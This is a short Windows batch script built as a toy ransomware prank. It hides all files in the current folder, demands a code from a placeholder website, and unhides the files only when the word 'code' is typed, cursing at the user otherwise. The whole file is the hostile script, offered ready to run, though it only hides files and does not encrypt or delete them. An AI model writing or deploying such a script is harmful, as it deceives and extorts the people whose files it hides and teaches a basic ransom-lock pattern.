@echo off
attrib +h *.*
echo CODE OR NO FILES!
echo Get your code here: www.url.com
set /p code=Enter: 
if %code%==code (
    attrib -h *.*
    echo Thanks!
    pause
    exit
)
if not %code%==code (
    echo FUCK U!
    pause
    exit
)
